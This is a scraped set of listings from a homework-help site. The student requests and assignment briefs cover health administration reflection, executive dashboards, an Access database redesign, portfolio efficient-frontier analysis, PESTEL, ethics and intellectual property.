assist w8:  | Nursing,,mh57w8.docx|SHS_Health_Admin-_Week_8_Template_for_Response_to_Faculty_Feedback_and_Self-Reflection.docx,SHS_Health_Admin-_Week_8_Template_for_Response_to_Faculty_Feedback_and_Self-Reflection.docx,"
Health Administration Programs



WEEK 8: RESPONSE TO FACULTY FEEDBACK AND SELF-REFLECTION SUMMARY









FEEDBACK REVIEW AND RESPONSE









Faculty Feedback




Learner Response








What feedback did my faculty provide? Locate and review all feedback provided (your signature assignment, the assignment grading rubric, and/or the audio/video feedback). 


What areas do I want to clarify, share my perspective, and ask questions about, comment on?  Share your rationale for information that was or was not included.




In what areas did I do well?


Summarize faculty notes/comments/feedback here.


Suggested Prompts to Address:
· Why do I think I did well in these areas? 
· Would I do anything differently (even if the faculty did not note it or only commended me on it)?





What are the area(s) in which I need to improve?


Summarize faculty notes/comments/feedback here. 


Suggested Prompts to Address:
· Why do I think I did not do well in these areas? 
· How would I address the faculty feedback and improve my work?
· Would I do anything differently (even if the faculty did not note it or only commended me on it)?
· Will I change my signature assignment so that it is ready to be included in my professional portfolio, and if so how? *
                            Please note that your signature assignment should not be resubmitted and it will not be regraded.
















SELF-REFLECTION SUMMARY





SUPPORTING DOCUMENTATION 

Identify resources to support your assertations. For each resource, include a statement of the key idea of the article, book, or professional resource and your justification of this choice.




How did faculty feedback throughout the course contribute to your mastery of the subject matter? 
Did the feedback faculty provided on your assignments in the course contribute to your understanding of the subject matter? What type of feedback did you find most useful? What type of feedback did you find least helpful?






Supporting documentation not needed for this question





How did this course contribute to the development of your professional competencies? 
Summarize how the course and the assignments helped you gain professional competencies.










Briefly discuss the practical relevance of this course to your professional growth and career interests. 
How did this course speak to your career interests and your areas of growth? If the course did not do this, explain why not and what would have been more useful to serve your professional growth. 



 








How did this course contribute to your understanding of the future trends and/or challenges related to the profession of Choose an item.? 
Reflect on why you would need to stay current on this topic or not. What do you need to be paying attention to? Is the field evolving and in what way? What are the trends? Is it important or irrelevant? Why or why not?











2
Version 2: 05/2020

",Nursing,Solution,https://www.sweetstudy.com/questions/assist-w8
Executive Dashboards: 1 Page APA format Scholarly ar | Information Systems,"1 Page
APA format
Scholarly articles mandatory
Plagiarism report mandatory",Week_11-Ch4.txt,Week_11-Ch4.txt,"
Assignment

Research a scholarly paper or professional video on ""Executive Dashboards""  and reflect on only one (1) of the following:

""Components"": What are the components of an executive dashboard in the display of management data? 
""Drill-down"": What is an example of a drill-down dashboard in interactive displays of management data?
""Analytics"": What type of analytics is most often shown on an executive dashboard? 

NOTE:

You must copy and paste the topic (""Components"" or ""Drill-down"" or ""Analytics"") at the start of your paper to provide a context for your answer.
This paper must be between 250-300 words on what caught your eye and reflect on what you read. 
Do not add extraneous text that does not address the question - do not add an introduction or conclusion.
You must provide an APA reference for your resource, provide the appropriate URL and provide in-text citations.
Do not use the Textbook as a resource.




===========================================================================================================================

When submitting work, be sure to include an APA cover page and include at least one APA formatted references (and APA in-text citations) to support the work this week.

All work must be original (not copied from any source).

1-word document/250-300 words
Scholarly Articles and use Reference Course TextBook for concepts
APA 7 format, with in-text citation
Please attach Plagiarism report

===========================================================================================================================

Reference Course TextBook

Title: Systems Analysis and Design
ISBN: 9780134817378
Authors: Kenneth E. Kendall, Julie E. Kendall
Publisher: Pearson
Publication Date: 2018
Edition: 10th ED.


APA : Kendall, K. E., & Kendall, J. E. (2018). Systems Analysis and Design (10th ed.). Pearson Education (US).
",Information Systems,Asap|Urgent,https://www.sweetstudy.com/questions/executive-dashboards
Microsoft Access Application Redesign,"I would like a Microsoft Application expert to completely redesign the following Application. It is an application for a trucking company and needs a complete design and functionality do-over. Firstly the login button needs a checkmark or show password option that will allow the user an option to see their password as it is being typed. Similarly, the buttons or forms on the main menu needs to be modified so that when the user clicks on the button or the form it should open in the same tab instead of opening in a new window. There is an extra hauled invoice table that is the exact copy of the invoice table therefore the hauled invoice can be deleted and the invoice table should be used to generate reports. There should be a print functionality button that will print the invoice and other reports after it is generated. This app is for a small business and the client is not happy with the visual appearance of the app (UI) so it needs to be modified and designed in such a way that looks both visually appealing and is easier to use. Having all the buttons or forms of the main menu or dashboard in one area would also help. Some of the requirements are:
 
INPUT:

The input forms that will be most important will be to enter the data from each load immediately after it has been delivered.
There will need to be a form to enter information about the equipment, trucks and trailers.
Form to enter new driver information
Form to create an invoice for each load that has been hauled.

REPORTS:

A report to show all loads hauled for each week.
A report to show all loads hauled for each driver each week.
A report to show maintenance shown for all trucks and trailer probably monthly.
A report to show a driver’s payroll for each week.  It should show all the loads they hauled each week with the pay being 25% of the total hauled each week.  It should show the taxes withheld each week.

I have provided a sample paper version of what the form should look like when it is printed.
The query needs to be worked on as well to function according to the tables. All the names of the forms and table should be organized and sorted. The current version has the tables names capitalized and the forms are not aligning with each other which needs to be fixed. ",,,,Computer Science,It,https://www.sweetstudy.com/questions/microsoft-access-application-redesign
finance : i just want the answer for que | Accounting,i just want the answer for question 2,AssignmentFRA.pdf,AssignmentFRA.pdf,"


Page 1 of 5  









 
FN625: Financial Risk Analysis 



 
Assignment 1 

(Please read all instructions and notes very carefully) 



 
Portfolio Choice and Performance Attribution 



 
Feb 05, 2023 



 
Required tasks: 

1. Familiarize yourself with the content of the data library on Professor Kenneth French’s 

webpage by reading the online legends and help. The web address of the data library is the 

following: 

http://mba.tuck.dartmouth.edu/pages/faculty/ken.french/data_library.html 

2. Then, select data from January 1963 to December 2023 on the 17 industry portfolios 

(value-weighted) and carry out the following analysis: 

a. Sketch the monthly MV efficient frontier of these portfolios using first the sample 

estimates of the required means and variance-covariance matrix. 

b. On the frontiers you constructed, highlight the points corresponding to the global 

minimum variance portfolio and to the tangency portfolio, assuming a risk-free rate 

equal to its average over the sample period. For these portfolios, also compute and 

report the mean excess-return, volatility and Sharpe ratio. 

c. Compare and contrast the frontiers you constructed. How would you explain their 

differences? 

3. Next, choose one stock from each of the 17 industries and repeat the analysis above. 

Compare and contrast the two pairs of MV efficient frontiers you constructed. How would 

you explain their differences? 

4. Select data for the appropriate sample period on the risk-free rate (included among the so- 

called “Fama and French factors”, and available for download from the same data library) 

and sketch the monthly MV efficient frontier for the 17 industry portfolios and the risk- 

free asset, using sample estimates of the required means and variance-covariance matrix. 




Page 2 of 5  











Compare and contrast this frontier to the ones previously constructed, after having 

explained the sample period for which you obtained data on the risk-free rate. 

5. Repeat the analysis required in the item just above (i.e., in question 4) using the Fama and 

French factor-mimicking portfolios, also available from the webpage of Prof Kenneth 

French, in place of the industry portfolios. Do so first using the so called “Fama/French 3 

Factors” and then the “Fama/French 5 Factors (2x3)” mimicking portfolios (See Fama and 

French, 1993, ”Common Risk Factors in the Returns on Stocks and Bonds,” Journal of 

Financial Economics, and Fama and French, 2014, “A Five-Factor Asset Pricing Model” 

for a complete description of the factor returns). Compare the resulting efficient frontiers 

to the ones previously obtained. How would you explain their differences? 

6. Repeat the above analysis (as specified in the item just above, namely question 5) using 

suitable “practical proxies” for the Fama and French factor-mimicking portfolios in place 

of the Fama and French factor-mimicking portfolios themselves. These practical proxies 

should be highly investable, keeping transaction and execution costs in mind. That is, they 

should be investable by the average portfolio manager, not necessarily the highly 

sophisticated portfolio manager capable of replicating the actual factor-mimicking 

portfolios. You may look for such proxy portfolios by checking out the websites of the 

main futures exchanges (e.g., look for futures on small caps, such as the Russell 2000 Index 

mini futures, and value/growth stocks) or even look for suitably focused ETFs (exchange 

traded funds).1 In particular, try and find ways to work around the difficulty of short-selling 

or minimize the associated costs. For ideas, check out this web-article: 

http://money.usnews.com/investing/articles/2016-06-07/why-investors-should-consider- 

small-cap-stocks 

Do so at least for “practical proxies” for the “Fama/French 3 Factors” and, ideally, also for 

the “Fama/French 5 Factors (2x3)” mimicking portfolios, for as long a sample period for 

which you can find data, making sure that the last observation is for December 2019 or 

later (i.e., do not work with ‘dead’ series). To work around the lack of long time series on 

suitable “practical proxies” (e.g., the Russell 2000 Index mini futures), you may use the 

time series on a closely correlated asset or portfolio (e.g., the stock index underlying the 

Russell 2000 Index mini futures, available since 1978), possibly after showing some 

evidence on the strength of the correlation. 

Compare and contrast the resulting efficient frontiers for the “practical proxies” to the ones 

for the corresponding factor mimicking portfolios (make sure both frontiers are estimated 

using the same sample period), explaining and/or commenting as appropriate. 

7. Re-estimate the monthly frontiers for the 17 industry portfolios and for the “Fama/French 

5 Factors (2x3)” mimicking portfolios over two contiguous time periods of equal length, 

one ending in December 1993 and the other one ending in December 2023, 

including the risk-free asset in the investment opportunity set. Pick at least one portfolio 



1 See, for example, the approach adopted by Faff (2003) [Faff, R.W., 2003, “Creating Fama and French Factors with 

Style”. Financial Review 38(2), 311-322]. 




Page 3 of 5  











from each of the frontiers estimated in the first period and, for the portfolios thus selected, 

compare the performance during this period to the performance during the second period. 

Do these portfolios remain on the efficient frontier out-of-sample? 

8. Then, for at least some of the assets previously considered, repeat the above analysis 

subject to any constraint and/or by applying any method, approach or technique (e.g., 

adding assets to better exploit the benefits of diversification, relying on the global 

minimum variance portfolio, resampling, etc.) that you believe might be of interest and 

might offer valuable insight from an investment management point of view. 

9. Use the market portfolio, the practical proxies and the tangency portfolios (as appropriate) 

on the various efficient frontiers you constructed above to assess the performance of 

three mutual funds of your choice, commenting on the results. A good source of data on 

mutual funds is Yahoo Finance. Please see the Appendix for help on how to access data on 

Yahoo Finance. 

Provide a soft copy report containing your findings, which should be appropriately tabulated so 

as to maximize their legibility, any required evaluation and discussion of your findings and, 

when appropriate, a description of the methodology adopted. The submitted report should be 

attached to the appropriate submission   form,   which   should   closely adhere to the template 

provided in Moodle and clearly provide   all   information required therein, including the 

assignment number, name and student number. 

The maximum length of the report should be 3000 words, including tables and figures (and 

everything else). Do not neglect to cite references as appropriate (of course, the bibliography 

is included in the word count). To stay within the word count, it will be important to organize 

your report appropriately (e.g., making appropriate use of tables, avoiding repetitions, etc.). 

Workings by way of MS Excel spreadsheets,  M a t l a b ,  R code and data should be a d d e d  

t o  M o o d l e  p a g e  e-mailed to     e-mail address: [email protected]. Although grades are 

solely based on your report, the workings are required to verify all calculations. In the email title, 

you should indicate FN625: Assignment 1.2 

The weighting on the overall module grade of this assignment are as specified in the course 

outline. 

 
2 Please note that this is a requirement and, if not fulfilled, I will not accept the submission, applying any relevant late 

submission penalty until a proper submission is made. 




Page 4 of 5  











Notes: 

• The required tasks in the above list are, to a large extent, in a sequential order, in the sense that 

the initial ones are necessary for the subsequent ones. Hence, if you run out of time, it is better 

to carry out the earlier ones to the best of your ability rather than trying to do everything to a 

lesser standard. 

• Clarity is of paramount importance and lack thereof will be penalized heavily. Essentially, as 

in real world endeavors, unclear answers and discussion will amount to not having provided 

the required answer/discussion. Hence, try and privilege clarity and quality over quantity. For 

example, if you are running out if time, it is better to address well a few questions than to 

attempt to address them all in a poor and, hence, necessarily obscure manner. 

• All the relevant information for the assignment is provided in this document and the course 

outline. If an aspect of the analysis is not specified in either document, it means that it is left 

for students to make a choice on it, in light of the theory covered in the course. 

• Students are required to make and motivate any such choice relying on the insight offered by 

the theory covered in the course and relevant references. The soundness of such choices, 

evaluated in the light of available theory and empirical evidence, will be assessed and 

contribute to the overall mark. The more advanced aspects of the assignment also require a 

certain amount of autonomous research, which will play an especially important role in the 

assignment of higher marks. 

• Submissions should contain, as appropriate, a literature review. The latter should strive to offer 

a comprehensive and systematic, yet succinct, review and discussion of academic and 

practitioners contributions to the body of knowledge on issues and topics examined during the 

course that are relevant to address the issues at hand, with the aim to expand and offer 

additional substantial insight compared to the insight and level of knowledge developed by the 

course material (including lectures). 

• In preparing the report, try and replicate as closely as possible the layout and structure (though 

subject to the applicable maximum length restriction) of academic papers that evaluate the 

performance of alternative portfolio construction methodologies. A good yet nice and readable 

example is the article by Stevenson (2002) titled “Ex-Ante and Ex-Post Performance of 

Optimal REIT Portfolios” (among the readings in Moodle). You might also take heed from 

industry reports that do something similar, which often have nice and witty ways of making 

insightful points, though strive to aim at a level of clarity and rigor comparable to the academic 

papers. The paper by Rob Arnott of Research Affiliates (titled “How Can Smart Beta Go 

Horribly Wrong”) is a good example of clear and compelling industry report: 

https://www.researchaffiliates.com/en_us/publications/articles/442_how_can_smart_beta_go_horribl 

y_wrong.html 




Page 5 of 5  











Please keep in mind however that, if you lack the insight of an industry maverick (that comes 

with many years of first-hand experience), the academic format might be a safer option as it is 

designed to facilitate making a point in an effective way relying only on research, without 

needing any special experience of the subject matter. An academic researcher gains insight 

from research, not necessarily experience, so it is a situation closer to the one of a typical 

student. 

• Appropriate use of tables and figures, as in academic papers and rigorous industry reports, is 

of crucial importance to attain the required clarity. They should be thoughtfully designed to 

maximize clarity and impact. For example, annotate your tables and figures to help the reader 

gain an immediate understanding of the findings reported therein. Also, try and condense your 

findings in as few tables and figures as possible, to help the reader see the overall picture 

emerging from your study. 

• Mutatis mutandis (i.e., with the appropriate adaptation) and unless otherwise specified, all the 

above notes apply to subsequent assignments too. 





 
Appendix – Accessing data in Yahoo Finance 

On Yahoo Finance, find two ETFs (Exchange Traded Funds) that have been listed for at least a year and 

download the time series of closing prices for the last 251 trading days (if any one of the ETFs does not 

trade on a given trading day, assume that the closing price is the same as for the previous trading day). 

To get this data, you need to go to https://finance.yahoo.com. Then, under the “My Screeners” tab, select 

the “Mutual Fund Screener” tab and, when the “Mutual Fund Screener” dialog box opens, add or remove 

filters according to your own preference. When you are done, press “Find Mutual Funds”. A selection of 

Mutual Funds will be shown. Choose the ones you want by clicking on the symbol of each. In the screen 

that opens when you click each Mutual Fund symbol, select the “Historical Data” tab and, in the screen that 

opens next, select the “Daily” frequency (from the dedicated drop-down menu) and then click “Download 

Data”. 


",Accounting,Urgent|Asap,https://www.sweetstudy.com/questions/finance-20798361
HR In Global Context: art 1: Worksheet Activity Usin | Human Resource Management,"art 1: Worksheet Activity
Using the PESTEL Analysis Worksheet, populate the third, fourth, and fifth rows: China, Japan, and Europe. Filling out these rows will help you visualize global values (such as each country’s cultural and political trends) and will assist you as you work toward completion of your final project
3-4 pages",,,,Human Resource Management,Solution,https://www.sweetstudy.com/questions/hr-in-global-context-20798369
discussion:   TO PREPARE  Review the Learn | Psychology," 
TO PREPARE

Review the Learning Resources for this week and specifically focus on how to create a narrated PowerPoint for your Final Project presentation.
Use the PowerPoint Template, located in this week’s Learning Resources, as a guide in completing this Final Project.

Final Project Assignment (11–15 narrated slides)
For this Final Project Assignment, you will create a 11- to 15-slide narrated PowerPoint presentation related to your Professional Development Plan.
Your PowerPoint presentation must include the following:

Cover Slide (1 slide)
    
 Include a cover slide with the following information: 
        
Project title
Date
University  
Course number  
Your name 




Part I: Personal and Professional Goals (3–4 slides)
    
Include a brief personal introduction, where you:
        
State your personal and professional goals.
Articulate how these goals intersect with your academic interests and selected field of study.


Review the mission of the university, and reflect on how this mission statement connects to your personal vision for future practice:
        
Walden University provides a diverse community of career professionals with the opportunity to transform themselves as scholar-practitioners so that they may transform society.


Explain how specialized learning will help you meet your career and personal life goals.


Part II: Educational Background and Research Proficiency (3–4 slides)
    
Reflect on the formal and informal learning experiences that compose your educational background, and then explain how these experiences support the direction of study you established in Part I.
Note: You are encouraged to include specifics about your individual knowledge, skills, and accomplishments.
Explain the academic and research proficiencies you bring to the program, and then identify any areas you want to consider for improvement.
For doctoral students, explain your current readiness to engage in academic research.
Note: Honest disclosure will help you gain clarity about any knowledge and/or skills on which you may need to improve in order to succeed in your program.
        
Categories for you to consider when writing this section include the following:
            
Academic coursework in the social and behavioral sciences
Academic coursework in other fields
Professional presentations, seminars, and workshops
Volunteer activities
Prior experience designing and executing research
Publications and other writing experiences
Teaching assignments
Professional training
Academic strengths and weaknesses
Research strengths and weaknesses
Availability of library, reference, and information technology resources


You should be clear about your plans for preparing for doctoral study, particularly if gaps exist in your background.




Part III: Plan of Study and Program Progress Guide (PPG) Form (3–4 slides)
    
Create a timeline for completing the requirements in your PPG for this Part III.
Note: Refer to your Program Progress Guide (PPG), which is available in your student portal.
In your timeline:
        
Group your degree requirements into stages of progress.
Note: It is suggested that you target a completion date and work backwards from this date.
Identify specific milestones of academic progress and time frames for completion.
Account for review, revision, and approval of academic work throughout your timeline.
Note: Be familiar with the approval processes of your academic work.




Part IV: Ethics and Positive Social Change (2–3 slides)
    
Explain how the APA ethical principles relate to positive social change.
Explain how ethics and positive social change align with your professional and academic goals.



Even though you are providing narration for your PowerPoint presentation, please also write detailed speaker notes for each slide to complement the slide content. Speaker notes should be clear, in-depth, and function as augmentation to the slide material.
Note: These notes should be written with sufficient depth to allow someone else to deliver the presentation. Make sure the PowerPoint presentation reflects graduate-level writing and presentation standards, with professional looking graphics and appropriate fonts, formatting, and spacing.
Your presentation should be explicit in its detail about what you plan to do at Walden to meet your personal and professional goals.",,,,Psychology,Criminal|Justice,https://www.sweetstudy.com/questions/discussion-20798371
Individual Rights & Vaccination Policy," School board trustees are requesting public comment before they vote on a vaccination policy for all children in a local school district. Should individual rights (e.g., parents’ rights to decide whether to vaccinate their children) be compromised to control the spread of communicable diseases for the good of society?  ",,,,Nursing,Bsn,https://www.sweetstudy.com/questions/individual-rights-and-vaccination-policy-20798373
"JJS D5: the term ""evolving standards o | Criminal","the term ""evolving standards of decency"" is coined in describing the Supreme Court's legal foundation on the question of executions of juveniles and life sentences without parole. After reading each of the seven Supreme Court penalty cases, do you agree or disagree with the Court's most current rulings as to juveniles? Would you agree that the Court's position on the death penalty and life sentences without parole is an ""evolving standard of decency?"" If not, what term would you propose",,,,Criminal,Solution,https://www.sweetstudy.com/questions/jjs-d5
Catholicism:   In your readings from the Ca | Nursing," 
In your readings from the Catechism of the Catholic Church and the Compendium of the Catechism of the Catholic Church you gleaned a better understanding of the what the Catholic Church’s teachings are on specific theological topics.  
You will now use the information gleaned in the text to delineate the teachings listed below in a concise manner: 

Catholic Understanding of God as Trinity
Salvation is Achieved through the Paschal Mystery of Jesus Christ
Eschatology – Death and the Afterlife
Freedom
Virtues
Sin  
",,,,Nursing,Bsn,https://www.sweetstudy.com/questions/catholicism-20798379
JJS D6: Chapter 5 of our text introduc | Criminal,"Chapter 5 of our text introduces us to police discretion and its various nuances. Imagine you are requested to provide a training module for recruits at your local law enforcement training academy on ""situationally based discretion.""  What would this training module include and what would be your reasoning for each segment?",,,,Criminal,Solution,https://www.sweetstudy.com/questions/jjs-d6
Music: need  help with music draft an | American history,need  help with music draft answer ,TheDanceoftheHoursbyAmilcarePonchielliisfromtheRomanticperiod.docx|MilestoneTwoGuidelinesandRubric.html1.zip,MilestoneTwoGuidelinesandRubric.html1.zip,"


Milestone Two Guidelines and Rubric.html
MUS 223 Milestone Two Guidelines and Rubric
Musical Interpretation
For Milestone Two, you will submit your musical interpretation. Begin your interpretation of the work by discussing your thoughts on the work and the musical elements that created the impressions you received from the music. Some musical analysis is necessary. For instance, you will identify which musical instruments are used, dynamics, tempo, form, and so on, as discussed in Module One. This assignment should be at least two pages long.
Specifically the following critical elements must be addressed:

Musical Interpretation: As you listen to the work, pay attention to the different musical elements and how they work together to create the work. As you listen, does the music create any images or stories in your mind or remind you of anything? Does it create any feelings or emotions in you?

                    
Identify each of the musical elements of the composition. Explain how each musical element is used and why they are important (e.g., the work of art’s dynamics, rhythm, tempo, form, etc.).
Analyze how the musical elements were employed in the work to create specific impressions. Did the elements change in different sections of the work? Was the melody more important in one section and the tempo or rhythm in another? Were different elements used to create different ideas, thoughts, feelings, emotions, or pictures in your mind?
Summarize a personal interpretation of the music. What about the piece first attracted you to it? The melody, rhythm, harmony, or something else? How did the chosen piece’s musical elements personally affect you? Is there a mood or emotion evoked by the work? Did it create a story or any images in your mind, or was it just enjoyable to listen to? Did you have different thoughts and/or feelings in different sections of the musical work? Does the emotion, feeling, or picture change as you listen to the entire work, or is it similar throughout? Have you heard the piece in the past, and if so, in what context?



What to Submit
Milestone Two should follow these formatting guidelines: Use of Part 1 of Connect for musical elements and terminology, 2 pages minimum, double spacing, 12-point Times New Roman font, one-inch margins, and citations in APA style.
Milestone Two Rubric



Criteria
Proficient (100%)
Needs Improvement (75%)
Not Evident (0%)
Value




Musical Interpretation: Musical Elements of Composition
Identifies the musical elements of compositions (e.g., the work of art’s dynamics, rhythm, tempo, form, etc.) and provides an explanation of how each element is used and their importance, using specific examples
Identifies the musical elements of compositions (e.g., the work of art’s dynamics, rhythm, tempo, form, etc.); explains how the elements are used and their importance, but does not provide specific examples
Does not identify the musical elements of compositions
25


Musical Interpretation: How Musical Elements Are Employed to Create Impressions
Analyzes how the musical elements were employed in the work to create different impressions and provides reasons as to why they created these impressions
Analyzes how the musical elements were employed in the work to create different impressions, but does not provide reasons as to why
Does not include the impressions created
25


Musical Interpretation: Personal Interpretation
Provides a personal summary and interpretation of the music and the music’s effect, using specific examples and referencing specific musical elements
Provides a personal summary and an interpretation of the music and the music’s effects, but does not provide specific examples or reference specific musical elements
Does not provide either a personal summary or an interpretation
25


Articulation of Response
Submission has no major errors related to citations, grammar, spelling, syntax, or organization
Submission has major errors related to citations, grammar, spelling, syntax, or organization that negatively impact readability and articulation of main ideas
Submission has critical errors related to citations, grammar, spelling, syntax, or organization that prevent understanding of ideas
25


Total:
100%




",American history,Ip ,https://www.sweetstudy.com/questions/music-20798401
law 3 : need help with law question dr | Law,need help with law question draft question ,ModuleThreeActivityGuidelinesandRubric.html.zip,ModuleThreeActivityGuidelinesandRubric.html.zip,"


Module Three Activity Guidelines and Rubric.html
COM 449 Module Three Activity Guidelines and Rubric
Overview
Communication professionals work with copyright and trademark as a regular part of their daily routine. Whether they are using in-house copyrighted and trademarked works or licensing the works of others for use by their own organization, it is essential that they understand how copyright and trademark work together.
Prompt
Imagine you work for a company that is introducing a new product line. As the director of communications, you are responsible for supervising the development of advertising materials related to the new product. You will need to protect your new advertising campaign and product from any infringement by competitors or others who may wish to use your creative work without your permission.
Using the information listed below, prepare a brief for your company’s leadership explaining specific steps you will take to ensure that the company’s own creative works are protected as its intellectual property. Also include how you will ensure the legal and ethical use of creative works developed by other organizations. Make sure to use evidence to support your explanations.
The company’s own creative works that need to be protected are:

The product name
The product logo
The product specifications
The catchphrase or tagline
The brand attributes and promotional material

The creative works by other organizations to be used in the marketing materials are:

Videos
Background music
Still images used in the advertising campaign

Specifically, you must address the following rubric criteria:

Intellectual Property Law: Explain the purpose and purview of intellectual property laws, using evidence to support your explanation.
Protection: Determine which creative works can be protected by copyright and trademark laws and explain the process for acquiring protection, using evidence to support your response.
Benefits and Repercussions: Analyze how organizations benefit from copyrighting and trademarking creative works and the repercussions they may face if they do not.
Impact of Noncompliance: Evaluate the impact noncompliance with intellectual property laws would have on an organization. Be sure to address topics such as perception, devaluation, and the importance of compliance, and use evidence to support your evaluation.

What to Submit
Submit this assignment as a Word document. It must be between 500 and 700 words in length. Sources should be cited according to APA style.
Module Three Activity Rubric



Criteria
Exemplary (100%)
Proficient (85%)
Needs Improvement (55%)
Not Evident (0%)
Value




Intellectual Property Law
Exceeds proficiency in an exceptionally clear, insightful, sophisticated, or creative manner
Explains the purpose and purview of intellectual property laws, using evidence to support the explanation
Shows progress toward proficiency, but with errors or omissions; areas for improvement may include incorporating further evidence to support the explanation
Does not attempt criterion
20


Protection
Exceeds proficiency in an exceptionally clear, insightful, sophisticated, or creative manner
Determines which creative works can be protected by copyright and trademark laws and explains the process for acquiring protection, using evidence to support the response
Shows progress toward proficiency, but with errors or omissions; areas for improvement may include further explaining the process involved in acquiring protection for creative works or incorporating more evidence to support the response
Does not attempt criterion
20


Benefits and Repercussions
Exceeds proficiency in an exceptionally clear, insightful, sophisticated, or creative manner
Analyzes how organizations benefit from copyrighting and trademarking creative works and the repercussions they may face if they do not
Shows progress toward proficiency, but with errors or omissions; areas for improvement may include adding more evidence to support the analysis as to why organizations benefit from licensing creative works and the repercussions they may face for not doing so
Does not attempt criterion
20


Impact of Noncompliance
Exceeds proficiency in an exceptionally clear, insightful, sophisticated, or creative manner
Evaluates the impact that noncompliance with intellectual property laws would have on an organization by addressing topics such as perception, devaluation, and the importance of compliance, using evidence to support the evaluation
Shows progress toward proficiency, but with errors or omissions; areas for improvement may include further evaluating the impact that noncompliance would have on an organization or incorporating more evidence to support the response
Does not attempt criterion
20


Articulation of Response
Exceeds proficiency in an exceptionally clear, insightful, sophisticated, or creative manner
Clearly conveys meaning with correct grammar, sentence structure, and spelling, demonstrating an understanding of audience and purpose
Shows progress toward proficiency, but with errors in grammar, sentence structure, and spelling, negatively impacting readability
Submission has critical errors in grammar, sentence structure, and spelling, preventing understanding of ideas
10


Citations and Attributions
Uses citations for ideas requiring attribution, with few or no minor errors
Uses citations for ideas requiring attribution, with consistent minor errors
Uses citations for ideas requiring attribution, with major errors
Does not use citations for ideas requiring attribution
10


Total:
100%




",Law,Ip ,https://www.sweetstudy.com/questions/law-3-20798403
Discussion Board:    Respond to the following: E | Psychology,"  
Respond to the following: Ethical dilemmas below and say what you would do. Site one the Code of Ethics standards to back your decision.
A social worker grew up in an African American Baptist community and is now working in a Hispanic Catholic community and finds the actions he observes as “wild and sometimes lazy”.  The social worker is consistently finding the same issues with every client in which they work.   You are the co-worker of the social worker, what if anything should you say? ",,,,Psychology,Human|Hum,https://www.sweetstudy.com/questions/discussion-board-20798407
6: Discuss what would have to tak | Nursing,"Discuss what would have to take place in the United States for passage of either a single-payer system or budget caps in total payments to providers under the Medicare program. Address questions such as the following: 
1. How will political ideology affect such a consideration? 
2. How will out-of-pocket costs affect such a possible change? 
3. What would be the transition challenges of making such a change?",,,,Nursing,Solution,https://www.sweetstudy.com/questions/6-20798409
